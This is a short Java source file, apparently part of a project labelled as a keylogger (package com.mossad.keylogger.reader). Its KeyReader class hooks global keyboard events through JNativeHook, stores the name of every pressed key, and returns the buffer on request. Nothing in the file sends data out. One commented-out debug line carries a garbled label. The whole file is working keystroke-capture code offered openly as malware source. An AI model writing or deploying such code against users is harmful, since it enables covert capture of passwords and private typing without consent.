package com.mossad.keylogger.reader;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.util.ArrayList;
import java.util.List;

public class KeyReader implements NativeKeyListener {

    private List<String> readSigns;
    private StringBuilder stringBuilder;

    public KeyReader() {
        readSigns = new ArrayList<>();
        stringBuilder = new StringBuilder();
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        //String modifiersText = NativeKeyEvent.getModifiersText(nativeKeyEvent.getKeyCode());
        char keyChar = nativeKeyEvent.getKeyChar();
        //System.out.println("readValue : "+keyText);
        //System.out.println("modifiersText: "+modifiersText);
        //System.out.println("k347rdjnbveyChar: "+ keyChar);
        readSigns.add(keyText);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

    public List getCollectedKeys() {

        List<String> result = new ArrayList(readSigns);
        readSigns.clear();
        return result;
    }

}
